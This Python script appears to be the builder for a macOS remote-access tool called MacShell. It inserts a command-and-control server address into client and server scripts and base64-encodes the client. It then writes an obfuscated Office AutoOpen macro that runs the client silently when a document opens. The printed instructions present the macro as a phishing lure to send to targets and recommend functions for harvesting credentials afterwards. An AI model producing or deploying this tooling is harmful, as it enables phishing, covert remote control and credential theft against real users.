import optparse
from optparse import OptionParser
import sys
import base64

if ((len(sys.argv) < 5 or len(sys.argv) > 5) and '-h' not in sys.argv):
    print("Usage: %s -s <C2 Server IP> -p <C2 Server Port>" % sys.argv[0])
    sys.exit(1)

parser = OptionParser()
parser.add_option("-s", "--server", help="C2 server IP address")
parser.add_option("-p", "--port", help="C2 server port")
(options, args) = parser.parse_args()

host = options.server
port = options.port

f1 = open('server.py','r')
f2 = open('macshell-server.py','w')

for line in f1:
    f2.write(line.replace('127.0.0.1', host).replace('443', port))

f1.close()
f2.close()

f3 = open('client.py','r')
f4 = open('macshell-client.py', 'w')

for line in f3:
    f4.write(line.replace('127.0.0.1', host).replace('443', port))

f3.close()
f4.close()

with open('macshell-client.py', 'r') as file:
    data = file.read()

data2 = base64.b64encode(data.encode('utf-8'))
data3 = data2.decode('utf8')

macrofile = open('macro.txt', 'w')
macrofile.write('Sub AutoOpen()\n')
macrofile.write("a = \"p\" + \"yt\" + \"h\" + \"on\"\n")
macrofile.write("b = \"ex\" + \"e\" + \"c\"\n")
macrofile.write("")

initializer = 0
totallength = len(data2)
while totallength > 0:
    if initializer == 0:
        int1 = 60*initializer
        int2 = 60 + int1
        text2 = data2[int1:int2].decode('utf8')
        macrofile.write("info = \"%s\"\n" % text2)
        totallength = totallength - 60
        initializer = initializer + 1
    else:
        int3 = 60*initializer
        int4 = 60 + int3
        text3 = data2[int3:int4].decode('utf8')
        macrofile.write("info = info + \"%s\"\n" % text3)
        totallength = totallength - 60
        initializer = initializer + 1
 
    
macro = "MacScript (\"do shell script \"\"\" & a & \" -c \\\"\"import base64,sys,socket,commands,os,ssl;\" & b & \"(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('\" & info & \"')))\\\"\" &> /dev/null \"\"\")\n"
macrofile.write(macro)
macrofile.write("End Sub\n")
macrofile.close()

print("-"*100)
print("==>Start macshell-server.py and then upload macshell-client.py to your target macOS device and execute.")
print("==>Or you can use the macro generated by macshell as a phishing lure (macro-enabled MS Office doc):")
print("Paste the macro code from macro.txt into your macro-enabled Office doc as a macro and send!")
print("[-] Note: When access is gained through the macro-enabled Word doc, some MacShell functions do not work due to restricted user context.")
print("[-] Affected MacShell functions are: \"screenshot\", \"persist\", and \"connections\"")
print("[-] If using as a phishing lure, I recommend using \"users\", \"addresses\", and \"prompt\" soon afterwards to get credentials.")

print("Happy hunting!")
print('')
print("Macro was written to macro.txt in the current working directory")

print("DONE!")
